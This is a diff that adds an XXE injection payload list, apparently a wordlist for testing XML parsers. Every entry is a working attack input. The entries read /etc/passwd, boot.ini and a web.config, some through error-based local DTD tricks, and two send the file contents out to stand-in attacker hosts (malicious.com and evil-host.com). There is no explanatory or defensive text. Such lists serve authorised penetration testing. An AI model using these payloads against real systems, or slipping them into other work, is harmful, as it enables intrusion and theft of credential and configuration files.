@@ -1,0 +1,56 @@
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root><?xml version="1.0"?>
+
+
+<!DOCTYPE data [<!ELEMENT data (#ANY)> <!ENTITY file SYSTEM "file:///etc/passwd">> <data>&file;</data>
+
+
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+
+
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+
+
+
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+
+
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///?t?/??s?w?"/></foo>
+
+
+
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "file:///?t?/??s?w?" ><!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">]><foo>&callhome;</foo>
+
+
+
+
+<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///?t?/??s?w?"> %local_dtd;]><root></root>
+
+
+
+<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamsa '<!ENTITY &#x25; file SYSTEM "file:///?t?/??s?w?"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;'>%local_dtd;]><root></root>
+
+
+
+
+<!DOCTYPE doc [<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"><!ENTITY % SuperClass '><!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">&#x25;eval;&#x25;error;<!ENTITY test "test"'>%local_dtd;]><xxx>cacat</xxx>
+
+
+<!DOCTYPE doc [<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd"><!ENTITY % SuperClass '><!ENTITY &#x25; file SYSTEM "https://erp.company.com"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">&#x25;eval;&#x25;error;<!ENTITY test "test"'>%local_dtd;]><xxx>cacat</xxx>
+
+
+
+
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
+%param1;
+%external;
+
+
+
+
+<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "file:///etc/passwd">]><foo>&xxe_test;</foo>
